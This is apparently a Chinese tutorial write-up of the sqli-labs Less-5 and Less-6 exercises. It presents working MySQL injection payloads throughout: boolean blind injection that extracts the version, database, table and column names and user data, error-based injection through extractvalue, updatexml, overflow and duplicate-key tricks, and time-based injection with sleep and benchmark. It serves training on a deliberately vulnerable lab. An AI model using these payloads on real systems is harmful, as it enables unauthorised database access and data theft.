# 五、答题模式-盲注的讲解-Less-5~6

### Less-5
直接加 `?id=1'#` ，这时候会报错语法错误 `syntax to use near '' LIMIT 0,1' at line 1`

那么我们应该要明白，报错多出的sql语句是 `' LIMIT 0,1` ，那么我们构造后的php语句就可能是：<br>
`  $sql = "select * from users where id='1' # ' limit 0,1 "  `

那么sql的语法错误就是： `' limit 0,1`

这时候我们需要的操作是将#替换成%23，但是**常用将 # 换成 --+** ，这时候会正常注释了多余出来的sql语句，即成功绕过。

在Less-5中，正常sql查询后会显示一个常量，因此我们需要操作的是对sql查询时候注入判断，正常执行后根据时候返回常量判断注入正确性。

开始布尔逻辑注入：

- 此处注入：<br>
    `?id=1' and left(version(),1)=5--+`<br>
    `?id=1' and left(version(),1)=4--+`

    可见是返回得到版本号是mysql5.版本。

- 继续注入：<br>
    `?id=1' and ascii(left(database(),1))=115--+`<br>
    此时是正常返回，那么可知115对应s，那么数据库名可以猜出了。

- `?id=1' and length(database())=8--+`<br>
    正常返回，可知数据库名长度为8。

-   `?id=1' and left(database(),2)>'sa'--+`<br>
    `?id=1' and left(database(),2)='se'--+`
    正常返回，可逐个猜库名。

-    `?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+`<br>
    109是m，这里是逐个猜表名的思路。

- `?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_schema=database() and column_name regexp '^pa' limit 0,1)--+`<br>
    继续猜表的列名，这里使用regexp匹配猜当前库的users表里是否存在pa开头的列名。

- `?id=1' and ord(mid((select IFNULL(CAST(username AS CHAR),0x20) from security.users order by id limit 0,1) ,1,1))=68 --+`<br>
    这里检索出数据，得到users表里数据的第一个id的username列第一个字符为68即D，可逐个慢慢检索。

小结：以上通过布尔盲注得到熟悉和理解。

接下来，使用报错型和延时盲注。


- 首先证实存在报错型盲注漏洞：<br>
    `?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+`

    Duplicate entry '::root@localhost::1' for key 'group_key'

- 利用double数值类型溢出报错注入：<br>
    `?id=1' union select 1,2,exp(~(select * from (select user())a))--+`
    
    DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

- 利用bigint溢出报错注入：<br>
    `?id=1' union select 1,2,!(select * from (select user())a) - ~0--+`

    BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'

- xpath报错——extractvalue检查函数<br>
    `?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+`
    
    XPATH syntax error: '~5.6.17~'

    这里@@version可以用version()替换。extractvalue()表示对xml的检查函数。
    
- xpath报错——updatexml修改函数<br>
    `?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+`

    XPATH syntax error: '~5.6.17~'
    
    这里@@version可以用version()替换。extractvalue()表示对xml的修改函数。

- 利用数据的重复性
    
    `?id=1'union select 1 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+`

    Duplicate column name '5.6.17'
    
    这里利用name_const()函数的列重复性报错。
    
    > 补充说明：**NAME_CONST(name,value)**<br>
    返回给定值。当用于产生结果集列时，NAME_CONST()使该列具有给定的名称。参数应为常量。<br>
    当然，对于应用程序可以使用简单的as别名，效果完全相同。<br>
    `mysql> SELECT NAME_CONST('myname', 14);`<br>
    结果如下：
    
    | myname |
    |--------|
    |     14 |
    
- 延时注入——sleep()函数
    
    `?id=1' and if(ascii(substr(database(),1,1))!=115,1,sleep(5))--+`

    这里利用sleep()函数进行延时注入，115是s，此时会有5秒的延迟返回。
    
- 延时注入——BENCHMARK()函数
    
    `?id=1' union select (if(substr(current,1,1)=char(115),benchmark(50000000,encode('msg','msg_pass')),null)),2,3 from  (select database() as current) as tb1--+`

    BENCHMARK()循环操作n次。
    
    
### Less-6
    
这里Less-6是和5差不多的，只是在id引用换为双引号。

直接给出payload：

`?id=1" and left(version(),1)=4--+`

    
```php
    $sql = "      "
    select * from users where id = " 1" and left(@@version,1)=5 #  " limit 0,1
```
    
#### **注意：单引号和双引号不能混用！！**

    
    